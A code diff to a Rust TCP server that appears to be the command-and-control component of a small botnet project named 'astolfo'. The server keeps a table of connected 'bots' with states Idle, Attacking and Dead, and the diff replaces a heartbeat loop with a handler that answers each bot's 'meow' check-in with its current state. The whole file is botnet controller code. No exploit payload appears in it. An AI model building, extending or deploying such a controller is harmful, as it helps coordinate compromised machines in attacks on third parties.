@@ -4,28 +4,26 @@ use std::{
     net::SocketAddr,
     process,
     sync::{Arc, Mutex},
-    time::Duration,
+    time::SystemTime
 };
 
-use astolfo::CMD;
+use astolfo::FemState;
+use bincode::Encode;
 use tokio::{
     io::{self, AsyncBufReadExt, AsyncReadExt, AsyncWriteExt, BufReader},
     net::{TcpListener, TcpStream},
-    time::sleep,
 };
 
-#[derive(Debug)]
-enum FemState {
-    Idle,
-    Attacking,
-    Dead,
-}
+
+
 
 #[derive(Debug)]
 struct Femboy {
-    addr: SocketAddr,
-    status: FemState,
+    state: FemState,
+    timestamp: SystemTime
 }
+
+type BotTable = Arc<Mutex<HashMap<SocketAddr, Femboy>>>;
 
 #[tokio::main]
 async fn main() {
@@ -38,11 +36,9 @@ async fn main() {
         process::exit(1);
     });
 
-    let femtable: Arc<Mutex<HashMap<u16, Femboy>>> = Arc::new(Mutex::new(HashMap::new()));
-    let fem_counter: Arc<Mutex<u16>> = Arc::new(Mutex::new(0));
+    let femtable: BotTable = Arc::new(Mutex::new(HashMap::new()));
 
     let listen_femtable = Arc::clone(&femtable);
-    let listen_fem_counter = Arc::clone(&fem_counter);
 
     let listen_task = tokio::spawn(async move {
         let listener = TcpListener::bind(format!("0.0.0.0:{port}"))
@@ -68,25 +64,15 @@ async fn main() {
                     process::exit(1);
                 });
 
-                let mut fem_counter = listen_fem_counter.lock().unwrap_or_else(|_| {
-                    process::exit(1);
-                });
-
                 femtable.insert(
-                    *fem_counter,
-                    Femboy {
-                        addr: femboy.1,
-                        status: FemState::Idle,
-                    },
+                    femboy.1,
+                    Femboy { state: FemState::Idle, timestamp: SystemTime::now() }
                 );
-                println!("[\x1b[92mSUCC\x1b[0m] New femboy ID {fem_counter}");
-                *fem_counter += 1;
+
             }
 
-            let stream = Arc::new(tokio::sync::Mutex::new(femboy.0));
-            let heartbeat_stream = Arc::clone(&stream);
-            tokio::spawn(async move { heartbeat(heartbeat_stream).await });
-            //tokio::spawn(async move { handle_femboy(femboy.0).await });
+            let bot_table = Arc::clone(&listen_femtable);
+            tokio::spawn(async move { handle_femboy(bot_table, femboy.1, femboy.0).await });
         }
     });
 
@@ -115,61 +101,42 @@ async fn main() {
     .await;
 }
 
-async fn heartbeat(stream: Arc<tokio::sync::Mutex<TcpStream>>) {
-    let mut ticker = tokio::time::interval(Duration::from_secs(5));
+async fn handle_femboy(femtable: BotTable, addr: SocketAddr, mut stream: TcpStream) {
     let config = bincode::config::standard();
-    let hello = bincode::encode_to_vec(CMD::hello, config).unwrap_or_else(|_| {
-        process::exit(1);
-    });
-
     loop {
-        ticker.tick().await;
-        let mut stream = stream.lock().await;
-
-        stream
-            .write_u16(hello.len() as u16)
-            .await
-            .unwrap_or_else(|_| {
-                panic!("Client disconnected :(");
-            });
-
-        stream
-            .write_all(hello.as_slice())
-            .await
-            .unwrap_or_else(|_| {
-                panic!("Client disconnected :(");
-            });
-
-        println!("Sent hello");
-
         let size = stream.read_u16().await.unwrap_or_else(|_| {
-            panic!("uh oh :(");
+            panic!("uh oh");
+        });
+        let mut buf = vec![0u8; size as usize];
+        stream.read_exact(buf.as_mut_slice()).await.unwrap_or_else(|_| {
+            panic!("uh oh");
         });
 
-        let mut buf = vec![0u8; size as usize];
-        stream
-            .read_exact(buf.as_mut_slice())
-            .await
-            .unwrap_or_else(|_| {
-                panic!("uh oh :(");
+        let msg = String::from_utf8(buf).unwrap_or_else(|_| {
+            panic!("Uh oh");
+        });
+
+        if msg == "meow" {
+            let state = {
+                let mut table = femtable.lock().unwrap_or_else(|_| {
+                    panic!("uh oh");
+                });
+
+                table.entry(addr).and_modify(|bot| bot.timestamp = SystemTime::now());
+                table[&addr].state.clone()
+            };
+
+            let payload = bincode::encode_to_vec(state, config).unwrap_or_else(|_| {
+                panic!("uh oh");
             });
 
-        match bincode::decode_from_slice::<CMD, _>(buf.as_slice(), config) {
-            Ok(cmd) => {
-                if let CMD::hello = cmd.0 {
-                    println!("Got hello back");
-                }
-            }
-            Err(_) => {
-                println!("Did not get hello back");
-            }
-        };
-    }
-}
+            stream.write_u16(payload.len() as u16).await.unwrap_or_else(|_| {
+                panic!("uh oh");
+            });
 
-async fn handle_femboy(mut stream: TcpStream) {
-    loop {
-        stream.write_all(b"Hello World").await.unwrap();
-        sleep(Duration::from_secs(1)).await;
+            stream.write_all(payload.as_slice()).await.unwrap_or_else(|_| {
+                panic!("uh oh");
+            })
+        }
     }
 }
